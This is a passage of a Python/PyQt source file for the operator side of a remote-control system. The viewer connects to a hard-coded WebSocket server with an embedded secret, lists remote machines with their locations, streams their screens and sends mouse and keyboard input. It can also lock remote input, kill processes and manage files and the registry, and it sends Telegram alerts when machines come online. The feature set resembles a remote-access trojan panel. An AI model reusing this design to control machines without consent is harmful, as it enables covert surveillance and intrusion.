        self.lock_remote_check.setStyleSheet('QPushButton { border-radius: 8px; padding: 8px 18px; font-size: 14px; background: #5865F2; color: #fff; font-weight: bold; } QPushButton:checked { background: #2e3040; color: #818cf8; }')
        self.chat_log.setStyleSheet('QListWidget { border-radius: 8px; font-size: 14px; background: #181a24; color: #e0e0e0; padding: 8px; }')
        self.chat_input.setStyleSheet('QLineEdit { border-radius: 8px; padding: 8px 12px; font-size: 14px; background: #1a1b24; color: #e8e9f5; border: 1px solid #2e3040; } QLineEdit:focus { border: 1px solid #5865F2; }')
        self.chat_send.setStyleSheet('QPushButton { border-radius: 8px; padding: 8px 18px; font-size: 14px; background: #5865F2; color: #fff; font-weight: bold; } QPushButton:hover { background: #6c7af4; }')

        # Initialize connection settings
        self.ws_url = 'ws://vnc.jake.cash:3000'  # Your server (change in Settings tab if needed)
        self.room_id = 'ops-room'
        self.secret = 'boi123'
        self.target_machine_id = ''
        self.ws: typing.Any = None
        self.join_confirmed = False
        self.connect_task: typing.Any = None
        self.loop = asyncio.get_event_loop()
        self._reconnect_delay = 1.0
        self._reconnect_attempt = 0
        self._reconnect_max_delay = 30.0
        self._connection_state = 'disconnected'  # disconnected, connecting, connected, reconnecting
        self._lock_remote_input = False
        self._stream_quality = 'medium'  # low, medium, high
        self._subscribe_all = True
        self._next_frame_machine_id = None
        self._thumbnail_labels = {}
        self._full_view_mode = False
        # FPS counter state
        self._fps_frame_count = 0
        self._fps_value = 0
        self._fps_timer = QTimer(self)
        self._fps_timer.timeout.connect(self._update_fps)
        self._fps_timer.start(1000)
        self._machine_info = {}
        self._flag_pixmaps: dict = {}  # cc -> QPixmap
        self._machine_notes_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'machine_notes.json')
        self._viewer_config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'viewer_config.json')
        self._server_presets: typing.List[typing.Any] = []
        self._load_viewer_config()
        # Telegram alert settings (loaded from viewer_config.json)
        self._tg_bot_token: str = ''
        self._tg_chat_id: str = ''
        self._tg_alert_online: bool = True
        self._tg_alert_resources: bool = False
        self._tg_resource_alerted: dict = {}  # machine_id -> last alert timestamp (cooldown)
        self._load_telegram_settings()
        self._selected_detail_machine: typing.Optional[str] = None
        self._pending_command_request: typing.Optional[str] = None
        self._pending_clipboard_request: typing.Optional[str] = None
        self.setup_ui()
        self.enable_remote_control()
        
        # Restore geometry and splitters
        geom = self.settings.value("geometry")
        if geom:
            self.restoreGeometry(geom)
        state = self.settings.value("windowState")
        if state:
            self.restoreState(state)
        # Restore specific splitters/sizes if possible
        sizes = self.settings.value("detail_splitter")
        if sizes:
            try:
                sizes = [int(x) for x in sizes]
                self.detail_splitter.setSizes(sizes)
            except (ValueError, TypeError):
                pass
        # Restore main sidebar/content splitter
        msizes = self.settings.value("main_splitter")
        if msizes and hasattr(self, 'main_splitter'):
            try:
                msizes = [int(x) for x in msizes]
                self.main_splitter.setSizes(msizes)
            except (ValueError, TypeError):
                pass
                
        # Defer connection until event loop is running (required for qasync)
        QTimer.singleShot(0, self._start_connection)
        self.sender_list.currentIndexChanged.connect(self.handle_sender_select)
        self.chat_send.clicked.connect(self.send_chat_message)
        self.mouse_center_btn.clicked.connect(lambda: self.send_remote_command('mouse_center'))
        self.mouse_left_btn.clicked.connect(lambda: self.send_remote_command('mouse_left'))
        self.mouse_right_btn.clicked.connect(lambda: self.send_remote_command('mouse_right'))
        self.key_send_btn.clicked.connect(self.send_key)
        self.kill_pid_btn.clicked.connect(self.send_kill_pid)
        self.selected_sender: typing.Optional[str] = None
        self.file_manager_window: typing.Any = None
        self.task_manager_window: typing.Any = None
        self.registry_editor_window: typing.Any = None

    def _start_connection(self):
        """Start WebSocket connection; called after event loop is running."""
        try:
            self.connect_task = asyncio.ensure_future(self.connect_to_server())
        except Exception as e:
            self.status_label.setText(f'Connection start failed: {e}')

    def _safe_update_senders(self, machines):
        """Update sender dropdown on Qt main thread; preserve selection if still in list (using UserData)."""
        try:
            current = self.sender_list.currentIndex()
            current_data = self.sender_list.itemData(current) if current >= 0 else None
            self.sender_list.clear()
            if machines:
                for m in machines:
                    self.sender_list.addItem(self._get_machine_display_string(m), m)
                idx = machines.index(current_data) if current_data and current_data in machines else 0
                self.sender_list.setCurrentIndex(idx)
                self.selected_sender = self.sender_list.itemData(idx)
                self.selected_sender_label.setText(f"Current sender: {self.selected_sender}")
            else:
                self.selected_sender = None
                self.selected_sender_label.setText('No sender selected')
            self._set_connection_status('connected', f'{len(machines)} sender(s)')
            self._rebuild_thumbnail_grid()
            if hasattr(self, 'machine_list'):
                self.machine_list.clear()
                for m in (machines or []):
                    item = QListWidgetItem(self._get_machine_display_string(m))
                    item.setData(Qt.UserRole, m)
                    self.machine_list.addItem(item)
        except Exception as e:
            self.status_label.setText(f'Update error: {e}')

    def _safe_add_sender(self, machine_id):
        """Add one sender to dropdown on Qt main thread; show notification (using UserData)."""
        try:
            if not machine_id:
                return
            current_ids = [self.sender_list.itemData(i) for i in range(self.sender_list.count())]
            if machine_id not in current_ids:
                disp = self._get_machine_display_string(machine_id)
                self.sender_list.addItem(disp, machine_id)
                if hasattr(self, 'machine_list'):
                    item = QListWidgetItem(disp)
                    item.setData(Qt.UserRole, machine_id)
                    self.machine_list.addItem(item)
                if self.sender_list.count() == 1:
                    self.sender_list.setCurrentIndex(0)
                    self.selected_sender = machine_id
                    self.selected_sender_label.setText(f"Current sender: {self.selected_sender}")
                self._set_connection_status('connected', f'sender "{machine_id}" available')
                self._show_notification(f'Sender online: {machine_id}')
                self._telegram_notify_online(machine_id, online=True)
                self._rebuild_thumbnail_grid()
        except Exception as e:
            self.status_label.setText(f'Update error: {e}')

    def _safe_remove_sender(self, machine_id):
        """Remove sender from dropdown on Qt main thread; notify if current sender went offline."""
        try:
            if not machine_id:
                return
            current_ids = [self.sender_list.itemData(i) for i in range(self.sender_list.count())]
            if machine_id in current_ids:
                idx = current_ids.index(machine_id)
                was_selected = (self.selected_sender == machine_id)
                self.sender_list.removeItem(idx)
                if hasattr(self, 'machine_list'):
                    for i in range(self.machine_list.count() - 1, -1, -1):
                        it = self.machine_list.item(i)
                        if it and it.data(Qt.UserRole) == machine_id:
                            self.machine_list.takeItem(i)
                if was_selected:
                    if self.sender_list.count() > 0:
                        self.sender_list.setCurrentIndex(0)
                        self.selected_sender = self.sender_list.itemData(0)
                        self.selected_sender_label.setText(f"Current sender: {self.selected_sender}")
                    else:
                        self.selected_sender = None
                        self.selected_sender_label.setText('No sender selected')
                self._show_notification(f'Sender offline: {machine_id}')
                self._telegram_notify_online(machine_id, online=False)
                self._rebuild_thumbnail_grid()
        except Exception as e:
            self.status_label.setText(f'Update error: {e}')

    def generate_client_folders(self):
        """Generate a Clients folder with subfolders for each machine."""
        try:
            # Get the base directory (where viewer.py is located)
            base_dir = os.path.dirname(os.path.abspath(__file__))
            clients_dir = os.path.join(base_dir, 'Clients')
            
            # Create Clients folder if it doesn't exist
            os.makedirs(clients_dir, exist_ok=True)
            
            # Get all machines from machine_info and current sender list
            all_machines = set()
            
            # Add machines from machine_info
            all_machines.update(self._machine_info.keys())
            
            # Add machines from sender list
            for i in range(self.sender_list.count()):
                machine_id = self.sender_list.itemData(i)
                if machine_id:
                    all_machines.add(machine_id)
            
            folders_created = 0
            folders_updated = 0
            
            for machine_id in all_machines:
                if not machine_id:
                    continue
                    
                # Get machine info to determine hostname
                info = self._machine_info.get(machine_id, {})
                hostname = info.get('hostname') or info.get('computerName') or info.get('computername')
                
                # Use hostname if available, otherwise use machine_id
                folder_name = hostname if hostname else machine_id
                
                # Sanitize folder name (remove invalid characters)
                invalid_chars = '<>:"/\\|?*'
                for char in invalid_chars:
                    folder_name = folder_name.replace(char, '_')
                
                # Create machine folder
                machine_folder = os.path.join(clients_dir, folder_name)
                
                if os.path.exists(machine_folder):
                    # Folder exists, add to it (could add timestamped subfolder or log)
                    folders_updated += 1
                    print(f"[INFO] Client folder already exists: {machine_folder}")
                    
                    # Optional: Create a timestamped subfolder for new session
                    from datetime import datetime
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    session_folder = os.path.join(machine_folder, f"session_{timestamp}")
                    os.makedirs(session_folder, exist_ok=True)
                    print(f"[INFO] Created session subfolder: {session_folder}")
                else:
                    # Create new folder
                    os.makedirs(machine_folder, exist_ok=True)
                    folders_created += 1
                    print(f"[INFO] Created new client folder: {machine_folder}")
                
                # Create a machine info file in the folder
                info_file = os.path.join(machine_folder, 'machine_info.json')
                try:
                    with open(info_file, 'w') as f:
                        json.dump({
                            'machine_id': machine_id,
                            'hostname': hostname,
                            'folder_created': datetime.now().isoformat(),
                            'last_seen': datetime.now().isoformat(),
                            'info': info
                        }, f, indent=2)
                except Exception as e:
                    print(f"[ERROR] Failed to create info file for {machine_id}: {e}")
            
            # Show status message
            total_machines = len(all_machines)
            message = f'Client folders processed: {total_machines} machines ({folders_created} new, {folders_updated} existing)'
            self._show_notification(message)
            print(f"[INFO] {message}")
            
            # Optional: Open the Clients folder in file explorer
            try:
                if platform.system() == 'Windows':
                    os.startfile(clients_dir)
                elif platform.system() == 'Darwin':  # macOS
                    import subprocess
                    subprocess.run(['open', clients_dir])
                else:  # Linux
                    import subprocess
                    subprocess.run(['xdg-open', clients_dir])
            except Exception as e:
                print(f"[ERROR] Failed to open Clients folder: {e}")
                
        except Exception as e:
            error_msg = f'Failed to generate client folders: {e}'
            self.status_label.setText(error_msg)
            print(f'[ERROR] {error_msg}')

    def _set_connection_status(self, state, detail=''):
        """Update internal state and status label with painted dot indicators."""
        self._connection_state = state
        _dot_tpl = (
            '<span style="display:inline-block; width:8px; height:8px; border-radius:4px;'
            ' background:{bg}; margin-right:6px; vertical-align:middle;">&bull;</span>'
        )
        if state == 'disconnected':
            dot = '<span style="color:#ef4444; font-size:14px;">&#9679;</span>'
            self.status_label.setText(f'{dot}  Disconnected')
            self.status_label.setStyleSheet(
                'color: #ff6b6b; font-weight: bold; font-size: 10pt;'
                'padding: 4px 8px; background: #1c1012; border: 1px solid #3d1f1f; border-radius: 6px;'
            )
        elif state == 'connecting':
            dot = '<span style="color:#fbbf24; font-size:14px;">&#9679;</span>'
            self.status_label.setText(f'{dot}  Connecting...')
            self.status_label.setStyleSheet(
                'color: #fbbf24; font-weight: bold; font-size: 10pt;'
                'padding: 4px 8px; background: #1c1a10; border: 1px solid #3d3520; border-radius: 6px;'
            )
        elif state == 'connected':
            dot = '<span style="color:#4ade80; font-size:14px;">&#9679;</span>'
            txt = f'{dot}  Connected — {detail}' if detail else f'{dot}  Connected'
            self.status_label.setText(txt)
            self.status_label.setStyleSheet(
                'color: #4ade80; font-weight: bold; font-size: 10pt;'
                'padding: 4px 8px; background: #0f1c14; border: 1px solid #1a3d24; border-radius: 6px;'
            )
        elif state == 'reconnecting':
            dot = '<span style="color:#fbbf24; font-size:14px;">&#9679;</span>'
            txt = f'{dot}  Reconnecting in {int(detail)}s...' if detail else f'{dot}  Reconnecting...'
            self.status_label.setText(txt)
            self.status_label.setStyleSheet(
                'color: #fbbf24; font-weight: bold; font-size: 10pt;'
                'padding: 4px 8px; background: #1c1a10; border: 1px solid #3d3520; border-radius: 6px;'
            )

    def _show_notification(self, message):
        """Show a short-lived notification (toast)."""
        self.status_label.setStyleSheet('color: #818cf8; font-weight: bold;')
        self.status_label.setText(f'ℹ️  {message}')
        QTimer.singleShot(3000, self._restore_status_after_notification)

    def _update_fps(self):
        """Called every 1 second by _fps_timer to update the FPS overlay label."""
        self._fps_value = self._fps_frame_count
        self._fps_frame_count = 0
        if hasattr(self, 'fps_overlay_label'):
            if self._fps_value > 0:
                # Color-code: green >=20, yellow 10-19, red <10
                if self._fps_value >= 20:
                    color = '#4ade80'
                elif self._fps_value >= 10:
                    color = '#fbbf24'
                else:
                    color = '#ef4444'
                self.fps_overlay_label.setStyleSheet(
                    f'background: rgba(0,0,0,180); color: {color}; font-family: Consolas, monospace;'
                    f' font-size: 11px; font-weight: bold; padding: 2px 8px; border-radius: 4px;'
                )
                self.fps_overlay_label.setText(f'{self._fps_value} FPS')
                self.fps_overlay_label.setVisible(True)
            else:
                self.fps_overlay_label.setVisible(False)

    def _restore_status_after_notification(self):
        if getattr(self, '_connection_state', None) == 'connected':
            n = self.sender_list.count()
            detail = f'{n} sender(s)' if n else 'no senders'
            self._set_connection_status('connected', detail)
        elif self._connection_state == 'reconnecting':
            self._set_connection_status('reconnecting', '')

    # ── MOTD (Message of the Day) ──

    def _update_motd(self, text):
        """Update the MOTD label in the top bar."""
        if not hasattr(self, 'motd_label'):
            return
        if text:
            self.motd_label.setText(f'📢  {text}')
            self.motd_label.setVisible(True)
        else:
            self.motd_label.setText('')
            self.motd_label.setVisible(False)

    def _send_motd_from_settings(self):
        """Send a set-motd message to the server (called from Settings tab)."""
        if not hasattr(self, 'motd_input'):
            return
        text = self.motd_input.text().strip()
        asyncio.ensure_future(self.send_ws({
            'type': 'set-motd',
            'message': text,
        }))
        self._update_motd(text)
        self.show_warning('MOTD updated.' if text else 'MOTD cleared.')

    # ---- Telegram Alert Methods ----

    def _load_telegram_settings(self):
        """Load Telegram settings from viewer_config.json."""
        try:
            if os.path.exists(self._viewer_config_path):
                with open(self._viewer_config_path, 'r') as f:
                    cfg = json.load(f)
                tg = cfg.get('telegram', {})
                self._tg_bot_token = tg.get('bot_token', '')
                self._tg_chat_id = tg.get('chat_id', '')
                self._tg_alert_online = tg.get('alert_online', True)
                self._tg_alert_resources = tg.get('alert_resources', False)
        except Exception:
            pass

    def _save_telegram_settings(self):
        """Save Telegram settings to viewer_config.json and update internal state."""
        try:
            self._tg_bot_token = self.tg_bot_token_input.text().strip()
            self._tg_chat_id = self.tg_chat_id_input.text().strip()
            self._tg_alert_online = self.tg_online_check.isChecked()
            self._tg_alert_resources = self.tg_resource_check.isChecked()

            cfg = {}
            if os.path.exists(self._viewer_config_path):
                with open(self._viewer_config_path, 'r') as f:
                    cfg = json.load(f)
            cfg['telegram'] = {
                'bot_token': self._tg_bot_token,
                'chat_id': self._tg_chat_id,
                'alert_online': self._tg_alert_online,
                'alert_resources': self._tg_alert_resources,
            }
            with open(self._viewer_config_path, 'w') as f:
                json.dump(cfg, f, indent=2)
            self.show_warning('Telegram settings saved.')
        except Exception as e:
            self.show_warning(f'Failed to save Telegram settings: {e}')

    def _send_telegram_test(self):
        """Send a test message to verify Telegram bot setup."""
        token = self.tg_bot_token_input.text().strip()
        chat_id = self.tg_chat_id_input.text().strip()
        if not token or not chat_id:
            self.show_warning('Enter both Bot Token and Chat ID first.')
            return
        msg = '✅ Monitor Viewer test alert — Telegram integration is working!'
        asyncio.ensure_future(self._send_telegram_message(msg, token=token, chat_id=chat_id))

    async def _send_telegram_message(self, text, token=None, chat_id=None):
        """Send a message via Telegram Bot API (non-blocking)."""
        import urllib.request
        import urllib.parse
        _token = token or self._tg_bot_token
        _chat_id = chat_id or self._tg_chat_id
        if not _token or not _chat_id:
            return
        url = f'https://api.telegram.org/bot{_token}/sendMessage'
        payload = urllib.parse.urlencode({
            'chat_id': _chat_id,
            'text': text,
            'parse_mode': 'HTML',
            'disable_web_page_preview': 'true',
        }).encode('utf-8')
        loop = asyncio.get_event_loop()
        try:
            def _post():
                req = urllib.request.Request(url, data=payload, method='POST')
                req.add_header('Content-Type', 'application/x-www-form-urlencoded')
                with urllib.request.urlopen(req, timeout=10) as resp:
                    return resp.read()
            await loop.run_in_executor(None, _post)
            QTimer.singleShot(0, lambda: self.show_warning('Telegram message sent.'))
        except Exception as e:
            QTimer.singleShot(0, lambda: self.show_warning(f'Telegram send failed: {e}'))

    def _telegram_notify_online(self, machine_id, online=True):
        """Fire a Telegram alert for machine online/offline (if enabled)."""
        if not self._tg_alert_online or not self._tg_bot_token or not self._tg_chat_id:
            return
        emoji = '🟢' if online else '🔴'
        state = 'ONLINE' if online else 'OFFLINE'
        info = self._machine_info.get(machine_id) or {}
        cc = info.get('countryCode', '')
        city = info.get('city', '')
        loc = f' ({city}, {cc})' if city and cc else (f' ({cc})' if cc else '')
        msg = f'{emoji} <b>{machine_id}</b>{loc} is now <b>{state}</b>'
        asyncio.ensure_future(self._send_telegram_message(msg))

    def _telegram_notify_resource(self, machine_id, cpu=None, ram=None):
        """Fire a Telegram alert for high CPU/RAM (if enabled, with 5-min cooldown per machine)."""
        if not self._tg_alert_resources or not self._tg_bot_token or not self._tg_chat_id:
            return
        now = time.time()
        last = self._tg_resource_alerted.get(machine_id, 0)
        if now - last < 300:  # 5-minute cooldown
            return
        parts = []
        if cpu is not None and cpu > 90:
            parts.append(f'CPU {int(cpu)}%')
        if ram is not None and ram > 90:
            parts.append(f'RAM {int(ram)}%')
        if not parts:
            return
        self._tg_resource_alerted[machine_id] = now
        msg = f'🔥 <b>{machine_id}</b> — {", ".join(parts)} (critical)'
        asyncio.ensure_future(self._send_telegram_message(msg))

    # File transfer methods removed
    def handle_sender_select(self, index):
        if index >= 0:
            self.selected_sender = self.sender_list.itemData(index)
            self.selected_sender_label.setText(f"Current sender: {self.selected_sender}")
            self.update_telemetry_panel()
            asyncio.ensure_future(self.send_ws({'type': 'select_sender', 'sender': self.selected_sender}))
            self._send_stream_quality_for_sender(self.selected_sender)
            if self._lock_remote_input:
                asyncio.ensure_future(self.send_ws({
                    'type': 'remote-control', 'action': 'lock-input', 'locked': self._lock_remote_input,
                    'machineId': self.selected_sender
                }))
        else:
            self.selected_sender = None
            self.selected_sender_label.setText('No sender selected')

    def _on_quality_changed(self, index):
        options = ['ultra', 'low', 'medium', 'high']
        self._stream_quality = options[min(index, len(options)-1)]
        if self.selected_sender:
            self._send_stream_quality_for_sender(self.selected_sender)

    def _send_stream_quality_for_sender(self, machine_id):
        if not machine_id:
            return
        q = self._stream_quality
        quality_map = {'ultra': ('ultra', 95), 'low': ('low', 30), 'medium': ('medium', 55), 'high': ('high', 85)}
        level, jpeg = quality_map.get(q, ('ultra', 95))
        asyncio.ensure_future(self.send_ws({
            'type': 'stream-quality', 'machineId': machine_id,
            'qualityLevel': level, 'jpegQuality': jpeg
        }))

    def _on_lock_remote_toggled(self):
        self._lock_remote_input = self.lock_remote_check.isChecked()
        self.lock_remote_check.setText('Unlock remote input' if self._lock_remote_input else 'Lock remote input')
        if not self.selected_sender:
            self.show_warning('Select a sender first.')
            self.lock_remote_check.setChecked(False)
            self._lock_remote_input = False
            return
        asyncio.ensure_future(self.send_ws({
            'type': 'remote-control', 'action': 'lock-input', 'locked': self._lock_remote_input,
            'machineId': self.selected_sender
        }))

    def update_selected_sender(self):
        index = self.sender_list.currentIndex()
        if index >= 0:
            self.selected_sender = self.sender_list.itemText(index)
            self.selected_sender_label.setText(f"Current sender: {self.selected_sender}")
        else:
            self.selected_sender = None
            self.selected_sender_label.setText('No sender selected')

    def handle_server_message(self, msg):
        try:
            data = json.loads(msg) if isinstance(msg, str) else msg
        except Exception as e:
            self.show_warning(f"handle_server_message: JSON decode failed: {e}")
            return
        msg_type = data.get('type')
        if msg_type == 'joined' and data.get('role') == 'receiver':
            self.join_confirmed = True
        if msg_type == 'sender_list':
            senders = data.get('senders', [])
            QTimer.singleShot(0, lambda m=senders: self._safe_update_senders(m))
        elif msg_type == 'active-machines':
            machines = data.get('machines', [])
            QTimer.singleShot(0, lambda m=machines: self._safe_update_senders(m))
        elif msg_type == 'file-list':
            fw = getattr(self, 'file_manager_window', None)
            if fw is not None:
                fw.update_remote_file_list(data)
        elif msg_type == 'file-data':
            fw = getattr(self, 'file_manager_window', None)
            if fw is not None:
                fw.receive_downloaded_file(data)

    def show_warning(self, message):
        self.status_label.setText(f'⚠️  {message}')
        self.status_label.setStyleSheet('color: #f87171; font-weight: bold;')
        QTimer.singleShot(3000, lambda: self._restore_status_after_notification())
    def enable_remote_control(self):
        # Enable mouse and keyboard events on stream_label (input originates from viewer)
        self.stream_label.setMouseTracking(True)
        self.stream_label.setFocusPolicy(Qt.StrongFocus)
        self.stream_label.mousePressEvent = self.handle_mouse_press
        self.stream_label.mouseReleaseEvent = self.handle_mouse_release
        self.stream_label.mouseMoveEvent = self.handle_mouse_move
        self.stream_label.wheelEvent = self.handle_mouse_wheel
        self.stream_label.keyPressEvent = self.handle_key_press
        self.stream_label.keyReleaseEvent = self.handle_key_release
        self.selected_sender = None
        self.stream_label.enterEvent = self.handle_stream_enter
       # self.stream_label.focusOutEvent = self.handle_stream_focus_out
    def handle_stream_focus_out(self, event):
        self.show_warning('Stream area lost focus. Click to re-enable keyboard control.')
        event.accept()

    def handle_stream_enter(self, event):
        event.accept()


    # Removed broken update_selected_sender (QComboBox has no .selectedItems()). Only handle_sender_select is used.

    def handle_mouse_press(self, event):
        label = self.get_active_stream_label()
        if not label.hasFocus():
            self.show_warning('Click the stream area to enable control.')
            return
        if not self.selected_sender:
            self.show_warning('Select a sender before controlling.')
            return
        xNorm, yNorm = self._event_to_normalized(label, event.x(), event.y())
        button = self.qt_button_to_str(event.button())
        asyncio.ensure_future(self.send_ws({
            'type': 'remote-control',
            'action': 'mouse-down',
            'xNorm': xNorm,
            'yNorm': yNorm,
            'button': button,
            'machineId': self.selected_sender
        }))

    def handle_mouse_release(self, event):
        label = self.get_active_stream_label()
        if not label.hasFocus():
            self.show_warning('Click the stream area to enable control.')
            return
        if not self.selected_sender:
            self.show_warning('Select a sender before controlling.')
            return
        xNorm, yNorm = self._event_to_normalized(label, event.x(), event.y())
        button = self.qt_button_to_str(event.button())
        asyncio.ensure_future(self.send_ws({
            'type': 'remote-control',
            'action': 'mouse-up',
            'xNorm': xNorm,
            'yNorm': yNorm,
            'button': button,
            'machineId': self.selected_sender
        }))

    def handle_mouse_move(self, event):
        label = self.get_active_stream_label()
        if not label.hasFocus():
            return
        if not self.selected_sender:
            return
        xNorm, yNorm = self._event_to_normalized(label, event.x(), event.y())
        now = time.time()
        if not hasattr(self, '_mouse_move_pending'):
            self._mouse_move_pending = False
        if not hasattr(self, '_last_mouse_move'):
            self._last_mouse_move = 0
        self._pending_xNorm = xNorm
        self._pending_yNorm = yNorm
        def send_latest():
            self._mouse_move_pending = False
            print(f"[DEBUG] Mouse move: sender={self.selected_sender}, xNorm={self._pending_xNorm:.4f}, yNorm={self._pending_yNorm:.4f}")
            asyncio.ensure_future(self.send_ws({
                'type': 'remote-control',
                'action': 'mouse-move',
                'xNorm': self._pending_xNorm,
                'yNorm': self._pending_yNorm,
                'machineId': self.selected_sender
            }))
            self._last_mouse_move = time.time()
        if now - self._last_mouse_move > 0.01:
            send_latest()
        elif not self._mouse_move_pending:
            self._mouse_move_pending = True
            QTimer.singleShot(10, send_latest)

    def _schedule_reconnect(self):
        """Schedule a reconnection with exponential backoff."""
        delay = min(self._reconnect_delay, self._reconnect_max_delay)
        self._reconnect_attempt += 1
        self._set_connection_status('reconnecting', str(int(delay)))

        def do_later():
            self._reconnect_delay = min(self._reconnect_delay * 2, self._reconnect_max_delay)
            self.connect_task = asyncio.ensure_future(self.connect_to_server())
        QTimer.singleShot(int(delay * 1000), do_later)

    def reconnect(self):
        """Immediate reconnect (e.g. after settings change). Resets backoff."""
        self._reconnect_delay = 1.0
        self._reconnect_attempt = 0
        async def cleanup():
            if self.connect_task:
                self.connect_task.cancel()
                try:
                    await self.connect_task
                except Exception:
                    pass
            if self.ws:
                try:
                    await self.ws.close()
                except Exception:
                    pass
                self.ws = None
        async def do_reconnect():
            await cleanup()
            self._stream_received = False
            self.connect_task = asyncio.ensure_future(self.connect_to_server())
        asyncio.ensure_future(do_reconnect())

    def handle_mouse_wheel(self, event):
        label = self.get_active_stream_label()
        if not label.hasFocus():
            self.show_warning('Click the stream area to enable control.')
            return
        if not self.selected_sender:
            self.show_warning('Select a sender before controlling.')
            return
        xNorm, yNorm = self._event_to_normalized(label, event.x(), event.y())
        delta = event.angleDelta().y()
        asyncio.ensure_future(self.send_ws({
            'type': 'remote-control',
            'action': 'mouse-wheel',
            'xNorm': xNorm,
            'yNorm': yNorm,
            'delta': delta,
            'machineId': self.selected_sender
        }))

    def handle_key_press(self, event):
        label = self.get_active_stream_label()
        if not label.hasFocus():
            self.show_warning('Click the stream area to enable control.')
            print("[DEBUG] handle_key_press: stream_label not focused.")
            return
        if not self.selected_sender:
            self.show_warning('Select a sender before controlling.')
            print("[DEBUG] handle_key_press: no sender selected.")
            return
        key = event.text()
        keyCode = event.key()
        # Only clear key for control keys, not punctuation
        if keyCode in [Qt.Key_Backspace, Qt.Key_Delete, Qt.Key_Return, Qt.Key_Enter, Qt.Key_Tab, Qt.Key_Escape] or (Qt.Key_F1 <= keyCode <= Qt.Key_F35):
            key = ''
        # For printable keys (including punctuation), key will be the correct character
        try:
            payload = {
                'type': 'remote-control',
                'action': 'key-press',
                'key': key,
                'keyCode': keyCode,
                'machineId': self.selected_sender
            }
            print(f"[DEBUG] handle_key_press sending: {payload}")
            asyncio.ensure_future(self.send_ws(payload))
            print(f"[DEBUG] Sent key-press: key={key}, keyCode={keyCode}, sender={self.selected_sender}")
        except Exception as e:
            print(f"[DEBUG] Failed to send key-press: {e}")

    def handle_key_release(self, event):
        label = self.get_active_stream_label()
        if not label.hasFocus():
            self.show_warning('Click the stream area to enable control.')
            return
        if not self.selected_sender:
            self.show_warning('Select a sender before controlling.')
            return
        key = event.text()
        keyCode = event.key()
        if keyCode in [Qt.Key_Backspace, Qt.Key_Delete, Qt.Key_Return, Qt.Key_Enter, Qt.Key_Tab, Qt.Key_Escape] or (Qt.Key_F1 <= keyCode <= Qt.Key_F35):
            key = ''
        try:
            asyncio.ensure_future(self.send_ws({
                'type': 'remote-control',
                'action': 'key-release',
                'key': key,
                'keyCode': keyCode,
                'machineId': self.selected_sender
            }))
            print(f"[DEBUG] Sent key-release: key={key}, keyCode={keyCode}, sender={self.selected_sender}")
        except Exception as e:
            print(f"[DEBUG] Failed to send key-release: {e}")

    async def send_ws(self, msg):
        """Send a WebSocket message."""
        if not self.ws or self.ws.closed:
            print('[DEBUG] WebSocket not connected, cannot send message')
            return
        
        try:
            message = json.dumps(msg)
            print(f"[DEBUG] Sending WebSocket message: {message[:200]}...")
            if 'reg-' in message:
                print(f"[DEBUG] Registry command: {message}")
            await self.ws.send(message)
            print(f"[DEBUG] WebSocket message sent successfully")
        except Exception as e:
            print(f'[DEBUG] Failed to send WebSocket message: {e}')

    def _event_to_normalized(self, label, event_x, event_y):
        """Convert click/move coords to normalized 0-1 over the stream image, accounting for KeepAspectRatio."""
        pixmap = label.pixmap()
        if not pixmap or pixmap.isNull():
            return (
                min(max(event_x / max(1, label.width()), 0), 1),
                min(max(event_y / max(1, label.height()), 0), 1)
            )
            
        pw, ph = pixmap.width(), pixmap.height()
        lw, lh = label.width(), label.height()
        
        if pw == 0 or ph == 0 or lw == 0 or lh == 0:
            return (0.5, 0.5)

        # QPixmap.scaled(lw, lh, Qt.KeepAspectRatio) logic
        scale_w = lw / pw
        scale_h = lh / ph
        scale = min(scale_w, scale_h)

        scaled_w = pw * scale
        scaled_h = ph * scale

        # QLabel centers the pixmap when alignment is Qt.AlignCenter
        x_offset = (lw - scaled_w) / 2.0
        y_offset = (lh - scaled_h) / 2.0

        # Adjust event coordinates relative to the actual drawn image area
        rel_x = event_x - x_offset
        rel_y = event_y - y_offset

        # Normalize against the scaled image dimensions
        xNorm = rel_x / scaled_w
        yNorm = rel_y / scaled_h

        # Clamp between 0.0 and 1.0 (in case of clicking on the letterbox black bars)
        return (
            min(max(xNorm, 0.0), 1.0),
            min(max(yNorm, 0.0), 1.0)
        )

    def qt_button_to_str(self, button):
        if button == Qt.LeftButton:
            return 'left'
        elif button == Qt.RightButton:
            return 'right'
        elif button == Qt.MiddleButton:
            return 'middle'
        return 'unknown'

    def send_remote_command(self, action):
        """Send a simple remote-control action (e.g. mouse_center, mouse_left, mouse_right)."""
        if not self.selected_sender:
            self.show_warning('Select a sender before controlling.')
            return
        payload = {
            'type': 'remote-control',
            'action': action,
            'machineId': self.selected_sender
        }
        asyncio.ensure_future(self.send_ws(payload))

    async def connect_to_server(self):
        try:
            self._set_connection_status('connecting')
            self.ws = await asyncio.wait_for(
                websockets.connect(
                    self.ws_url,
                    ping_interval=20,
                    ping_timeout=20,
                    close_timeout=5,
                ),
                timeout=15,
            )
            # Send join message
            join_msg = {
                'type': 'join',
                'role': 'receiver',
                'roomId': self.room_id,
                'secret': self.secret,
                'targetMachineId': self.target_machine_id,
                'machineId': self.machine_id
            }
            await self.ws.send(json.dumps(join_msg))
            await self.ws.send(json.dumps({'type': 'set-subscribe-all', 'enabled': True}))
            await self.listen_server()
            # Connection closed (loop exited)
            self._set_connection_status('disconnected')
            self._schedule_reconnect()
        except asyncio.CancelledError:
            self._set_connection_status('disconnected')
        except Exception as e:
            self._set_connection_status('disconnected')
            self.status_label.setText(f'Connection failed: {e}')
            self._schedule_reconnect()

    async def listen_server(self):
        try:
            async for message in self.ws:
                # Handle binary messages as images
                if isinstance(message, bytes):
                    try:
                        image = QImage.fromData(message)
                        if not image.isNull():
                            print(f"[DEBUG] Received image: {image.width()}x{image.height()} bytes={len(message)}")
                            if not getattr(self, '_stream_received', False):
                                self._stream_received = True
                                self._set_connection_status('connected', 'receiving stream')
                            self._fps_frame_count += 1
                            pixmap = QPixmap.fromImage(image)
                            if self._subscribe_all and getattr(self, '_next_frame_machine_id', None):
                                mid = self._next_frame_machine_id
                                self._next_frame_machine_id = None
                                if mid in self._thumbnail_labels:
                                    # pyre-ignore[19]
                                    def _set(m, p):
                                        if m in self._thumbnail_labels:
                                            widgets = self._thumbnail_labels[m]
                                            if isinstance(widgets, dict):
                                                # Update both grid and list thumbnails
                                                if 'grid' in widgets:
